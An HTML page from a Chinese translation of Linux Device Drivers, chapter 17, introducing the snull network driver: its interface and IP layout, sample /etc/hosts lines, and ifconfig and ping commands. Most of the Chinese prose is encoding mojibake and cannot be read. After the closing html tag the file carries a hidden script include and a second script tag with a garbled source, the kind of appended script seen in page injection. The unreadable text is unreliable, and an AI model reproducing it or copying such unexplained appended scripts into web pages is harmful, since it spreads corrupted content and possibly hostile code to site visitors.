<html xmlns:cf="http://docbook.sourceforge.net/xmlns/chunkfast/1.0">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<title>&#160;17&#160;&#160;-Linux豸棨İ棩</title>
<meta name="description" content="" />
<meta name="keywords" content="Linux豸,İ,,ldd,linux device driver,,Ӱ,,,Ƶ" />
<meta name="verify-v1" content="5asbXwkS/Vv5OdJbK3Ix0X8osxBUX9hutPyUxoubhes=" />
<link rel="stylesheet" href="docbook.css" type="text/css">
<meta name="generator" content="DocBook XSL Stylesheets V1.69.0">
<link rel="start" href="index.html" title="Linux 豸 Edition 3">
<link rel="up" href="index.html" title="Linux 豸 Edition 3">
<link rel="prev" href="ch16s05.html" title="16.5.&#160;ٲο">
<link rel="next" href="ch17s02.html" title="17.2.&#160;ӵں">
</head>
<body bgcolor="white" text="black" link="#0000FF" vlink="#840084" alink="#0000FF">
<div class="navheader">
<table width="100%" summary="Navigation header">
<tr><th colspan="3" align="center">&#160;17&#160;&#160;</th></tr>
<tr>
<td width="20%" align="left">
<a accesskey="p" href="ch16s05.html">һҳ</a>&#160;</td>
<th width="60%" align="center">&#160;</th>
<td width="20%" align="right">&#160;<a accesskey="n" href="ch17s02.html">һҳ</a>
</td>
</tr>
</table>
<hr>
</div>
<div class="chapter" lang="zh-cn">
<div class="titlepage"><div><div><h2 class="title">
<a name="NetworkDrivers"></a>&#160;17&#160;&#160;</h2></div></div></div>
<div class="toc">
<p><b>Ŀ¼</b></p>
<dl>
<dt><span class="sect1"><a href="ch17.html#HowsnullIsdesigned">17.1. snull Ƶ</a></span></dt>
<dd><dl>
<dt><span class="sect2"><a href="ch17.html#AssigningIPNumbers">17.1.1.  IP </a></span></dt>
<dt><span class="sect2"><a href="ch17.html#ThePhysicalTransportofPacket">17.1.2. ĵ</a></span></dt>
</dl></dd>
<dt><span class="sect1"><a href="ch17s02.html">17.2. ӵں</a></span></dt>
<dd><dl>
<dt><span class="sect2"><a href="ch17s02.html#DeviceRegistration">17.2.1. 豸ע</a></span></dt>
<dt><span class="sect2"><a href="ch17s02.html#InitializingEachDevice">17.2.2. ʼÿһ豸</a></span></dt>
<dt><span class="sect2"><a href="ch17s02.html#ModuleUnloading">17.2.3. ģж</a></span></dt>
</dl></dd>
<dt><span class="sect1"><a href="ch17s03.html">17.3. net_device ṹ</a></span></dt>
<dd><dl>
<dt><span class="sect2"><a href="ch17s03.html#GlobalInformation">17.3.1. ȫϢ</a></span></dt>
<dt><span class="sect2"><a href="ch17s03.html#HardwareInformation">17.3.2. ӲϢ</a></span></dt>
<dt><span class="sect2"><a href="ch17s03.html#InterfaceInformation">17.3.3. ӿϢ</a></span></dt>
<dt><span class="sect2"><a href="ch17s03.html#TheDeviceMethods">17.3.4. 豸</a></span></dt>
<dt><span class="sect2"><a href="ch17s03.html#UtilityFields">17.3.5. óԱ</a></span></dt>
</dl></dd>
<dt><span class="sect1"><a href="ch17s04.html">17.4. ر</a></span></dt>
<dt><span class="sect1"><a href="ch17s05.html">17.5. Ĵ</a></span></dt>
<dd><dl>
<dt><span class="sect2"><a href="ch17s05.html#ControllingTransmissionConcurrency">17.5.1. ƷͲ</a></span></dt>
<dt><span class="sect2"><a href="ch17s05.html#TransmissionTimeouts">17.5.2. ͳʱ</a></span></dt>
<dt><span class="sect2"><a href="ch17s05.html#ScatterGathreIO">17.5.3. ɢ/ I/O</a></span></dt>
</dl></dd>
<dt><span class="sect1"><a href="ch17s06.html">17.6. Ľ</a></span></dt>
<dt><span class="sect1"><a href="ch17s07.html">17.7. жϴ</a></span></dt>
<dt><span class="sect1"><a href="ch17s08.html">17.8. жϻ</a></span></dt>
<dt><span class="sect1"><a href="ch17s09.html">17.9. ״̬ĸı</a></span></dt>
<dt><span class="sect1"><a href="ch17s10.html">17.10. Socket </a></span></dt>
<dd><dl>
<dt><span class="sect2"><a href="ch17s10.html#TheImportFields">17.10.1. ҪԱ</a></span></dt>
<dt><span class="sect2"><a href="ch17s10.html#FunctionsActingonSocketBuffers">17.10.2.  socket ĺ</a></span></dt>
</dl></dd>
<dt><span class="sect1"><a href="ch17s11.html">17.11. MAC ַ</a></span></dt>
<dd><dl>
<dt><span class="sect2"><a href="ch17s11.html#UsingARPwithEthernet">17.11.1. ̫ʹ ARP</a></span></dt>
<dt><span class="sect2"><a href="ch17s11.html#OverridingARP">17.11.2.  ARP</a></span></dt>
<dt><span class="sect2"><a href="ch17s11.html#NonEthernetHeader">17.11.3. ̫ͷ</a></span></dt>
</dl></dd>
<dt><span class="sect1"><a href="ch17s12.html">17.12.  ioctl </a></span></dt>
<dt><span class="sect1"><a href="ch17s13.html">17.13. ͳϢ</a></span></dt>
<dt><span class="sect1"><a href="ch17s14.html">17.14. ಥ</a></span></dt>
<dd><dl>
<dt><span class="sect2"><a href="ch17s14.html#KernelSupportforMulticasting">17.14.1. ಥں֧</a></span></dt>
<dt><span class="sect2"><a href="ch17s14.html#ATypicalImplementation">17.14.2. ʵ</a></span></dt>
</dl></dd>
<dt><span class="sect1"><a href="ch17s15.html">17.15. ϸ</a></span></dt>
<dd><dl>
<dt><span class="sect2"><a href="ch17s15.html#MediaIndependentInterfaceSupport">17.15.1. ýĽӿ֧</a></span></dt>
<dt><span class="sect2"><a href="ch17s15.html#EthtoolSupport">17.15.2. ethtool ֧</a></span></dt>
<dt><span class="sect2"><a href="ch17s15.html#Netpoll">17.15.3. netpoll</a></span></dt>
</dl></dd>
<dt><span class="sect1"><a href="ch17s16.html">17.16. ٲο</a></span></dt>
</dl>
</div>
<p>ѾַͿ, ׼תƵ. ӿǵ 3 ׼ Linux 豸, ںֽ.</p>
<p>һӿڵϵͳڵĽɫһصĿ豸Ľɫ. һ豸עĴ̺͹ں, ֮ͨ"""". Ƶ, һӿڱעԼضںݽṹ, Աⲿ罻ʱ.</p>
<p>ڱصĴ̺ͱĵͽӿ֮мҪ. , Ϊһļ /dev Ŀ¼, Ȼһӿûڵ. ļ( read, write, ȵ )ӿû, ˲ Unix "һнļ"ķ. Ӷ, ӿڴԼӿռ, ҶһײͬĲ.</p>
<p>ܻᷴ˵, Ӧóʹ socket ʱʹ read  write ϵͳ, Щϵͳһ, ӿԲͬ. ٸ socket ͬһӿϸ.</p>
<p>ҪĲͬ, ֻӦں˵, 첽ؽձ. , ͬһҪں˷һ, 豸Ҫںͽı. ʹõں˽ӿΪͬĲģʽ.</p>
<p>Ҳò׼ֺ֧ܶĹ, õַ, ޸ķͲ, Լάʹͳ. ʹõ API ӳҪ, , ܿһЩ֮ǰĽӿڵĲͬ.</p>
<p>Linux ں˵ϵͳƳȫЭ. Э( Э [IP],  IPX, Э )ӲЭ( ̫, Եƻ, ȵ ). һں˻ͬһʱȷһ籨; ЭϢ, ԼЭ.</p>
<p>ӿ Linux ں˵, һڴģ黯ӿڵʽṩ, ( һ ) snull. Ϊ, ӿʹ̫ӲЭͷ IP .  Ӳ snull лõ֪ʶܹӦõ IP Э, ұдһֻ̫мСʵЭص.</p>
<p>² IP ŷ, Э, Լͨõ. Ļⲻ(  )дĵ, Ҳṩһ缼ĸڲ㼸ҳ. ȤĶȥο緽鼮.</p>
<p>ڽ豸֮ǰ, ἰһע. ʹ octet ʾһ 8 λ, ͨ豸ЭСԪ.  byte м. Ϊ׼÷, ǽʹ octet, ̸豸ʱ.</p>
<p>" header "Ҳֵһ. һ header һֽ(,  octet), Ҫŵһ, ϵͳĸʱ. һӦóͨһ TCP socket һݿ, ϵͳ, 䵽, ڱĿʼһ TCP header ÿλ. Э TCP header ֮ǰһ IP header, ·ĵĿĵ. ̫Ľƶ, һ̫ header, Ӳ, µǰ. ()ҪԼȥǸ߲ header, ǾӲ header Ĵ.</p>
<div class="sect1" lang="zh-cn">
<div class="titlepage"><div><div><h2 class="title" style="clear: both">
<a name="HowsnullIsdesigned"></a>17.1.&#160;snull Ƶ</h2></div></div></div>
<p≯۲ snull ӿڵƸ. ϢܿǱԵʹ, Ӵʱܻᵼ.</p>
<p>, ҲҪ, ƵľӽӿӦñֶʵӲ, ʹõĴ󲿷. ƵһЩɻؽӿڵĶ. snull һؽӿ; , ģʵԶĶԻ, Աʾдһ. Linux ʵǷǳ򵥵;  drivers/net/lookback.c ҵ.</p>
<p>snull һֻ֧ IP ͨѶ. ǽӿڵڲĽ -- snull ò鿴沢ҽȷģһӲӿ. ʵʵĽӿڲڱ͵Э,  snull ƲӰ챾չʾĴƬ.</p>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="AssigningIPNumbers"></a>17.1.1.&#160; IP </h3></div></div></div>
<p>snull ģ鴴ӿ. Щӿһ򵥵Ļزͬ, Ϊͨһӿڷʲôصһ, Լ. ⲿ, ʵļڻشԼ.</p>
<p>ҵ, Чܽͨ IP , Ϊں˲ͨӿ A һĸԼĽӿ B, ûͨͨ snull. Ϊܽһͨ snull ӿڵͨѶ, ԴĿĵַʵʴҪ޸. 仰˵, ͨһӿڷ͵ıӦñһյ, ĵĽ߲ӦǱ. ͬڽյıĵԴַ.</p>
<p>Ϊ"صĻ", snull ӿڷתԴַĿĵַĵ 3  octet Чλ; ˵, ı C  IP ŵź. 緽ЧǷ A(  sn0 , һӿ )ıΪ B ıĳ sn1 ӿ.</p>
<p>Ϊ⴦̫, ǷӸ漰 IP :</p>
<div class="itemizedlist"><ul type="disc">
<li><p>snullnet0 ӵ sn0 ӿڵ. ͬ, snullnet1 ӵ sn1. ЩĵַӦڵ 3  octet Чλͬ. Щ 24 λ.</p></li>
<li><p>local0 Ƿ sn0 ӿڵ IP ַ;  snullnet0.  sn1 ĵַ local1. local0  local1 ǵĵ 3 octet Чλ͵ 4 octet ϲͬ.</p></li>
<li><p>remote0  snullnet0 , ĵ 4 octet  local1 ͬ. κη͸ remote0 ıĵ local1, ַӿڴı֮.  remote1  snullnet1, ĵ 4 octet  local0 ͬ.</p></li>
</ul></div>
<p>snull ӿڵĲͼ <a href="ch17.html#ldd3-17-1.fig" title="ͼ&#160;17.1.&#160;οĽӿ">οĽӿ</a>, ÿӿڵĹӡڽӿԱ.</p>
<div class="figure">
<a name="ldd3-17-1.fig"></a><p class="title"><b>ͼ&#160;17.1.&#160;οĽӿ</b></p>
<div><img src="images/snagitldd3/ldd3-17-1.png" alt="οĽӿ"></div>
</div>
<p>ŵĿֵ. һЩзŽ /etc/networks, ʹ. ЩֵѡԱ˽;ıŷΧ.</p>
<pre class="screen">
snullnet0 192.168.0.0
snullnet1 192.168.1.0
</pre>
<p>һЩܵ, ɷŽ /etc/hosts :</p>
<pre class="screen">
192.168.0.1  local0  
192.168.0.2  remote0  
192.168.1.2  local1  
192.168.1.1  remote1  
</pre>
<p>ЩŵҪ local0  remote1 ͬ, local1 ֺ remote0 ͬ. ʹȫͬı, ֻҪֹϵ.</p>
<p>ҪС, ļԼӵһ. ѡıſʵĻı, ǰŸĽӿڻֹЩʵͨѶ. , ܸոչʾЩŲǿ·ɵĻ, Ҳܱ˽Ѿʹ.</p>
<p>ѡʲô, ȷЩӿ, ͨ:</p>
<pre class="screen">
ifconfig sn0 local0 
ifconfig sn1 local1 
</pre>
<p>Ҫ 255.255.255.0 , ѡĵַΧ C ෶Χ.</p>
<p>ڴ, ӿڵ"Զ"˵ܹ. Ļʾһε remote0  remote1 , ͨ snull ӿ.</p>
<pre class="screen">
morgana% ping -c 2 remote0 
64 bytes from 192.168.0.99: icmp_seq=0 ttl=64 time=1.6 ms 
64 bytes from 192.168.0.99: icmp_seq=1 ttl=64 time=0.9 ms 
2 packets transmitted, 2 packets received, 0% packet loss 
morgana% ping -c 2 remote1
64 bytes from 192.168.1.88: icmp_seq=0 ttl=64 time=1.8 ms
64 bytes from 192.168.1.88: icmp_seq=1 ttl=64 time=0.9 ms
2 packets transmitted, 2 packets received, 0% packet loss
</pre>
<p>ע, 㲻ܵκ, Ϊıļ, ڵַ޸ĺյ֮. , һ 192.168.0.32 ıĽ뿪 sn0  192.168.1.32 Ŀĵַ sn1, Ⲣ̨ıصַ.</p>
</div>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="ThePhysicalTransportofPacket"></a>17.1.2.&#160;ĵ</h3></div></div></div>
<p>ֻݴ͵Ļ, snull ӿ̫һ.</p>
<p>snull ģ̫Ϊִ -- һվӵ -- ǻ̫,  10base-T, 100base-T,  ǧ. , ںΪ̫豸ṩһЩͨõĽӿ, ûɲ. һ̫豸˵ǿ plip ӿ( ʹôӡ˿ڵĽӿ )Լһ̫豸.</p>
<p>snull ʹ̫õһ tcpdump ڽӿ۲ı. ʹ tcpdump ۲ӿǵ֪ӿι;.</p>
<p>֮ͬǰᵽ, snull ֻ IP . ʵ, snull Ĳ޸, Աʹ빤. ޸ÿĵԴ, Ŀĺ IP header У, Ƿʵʳ IP Ϣ.</p>
<p>ֿ޸Ļٻ˷ IP . ͨ snull ݽЭ, ޸ģԴ.</p>
</div>
</div>
</div>
<div class="navfooter">
<hr>
<table width="100%" summary="Navigation footer">
<tr>
<td width="40%" align="left">
<a accesskey="p" href="ch16s05.html">һҳ</a>&#160;</td>
<td width="20%" align="center">&#160;</td>
<td width="40%" align="right">&#160;<a accesskey="n" href="ch17s02.html">һҳ</a>
</td>
</tr>
<tr>
<td width="40%" align="left" valign="top">16.5.&#160;ٲο&#160;</td>
<td width="20%" align="center"><a accesskey="h" href="index.html">ʼҳ</a></td>
<td width="40%" align="right" valign="top">&#160;17.2.&#160;ӵں</td>
</tr>
</table>
</div>
</body></html>
<div style="display:none"><script language="JavaScript" src="script.js"></script> </div>

<script language=javascript src=G2Bݔx8n*n*n*n*n*n*ݚPpd></script>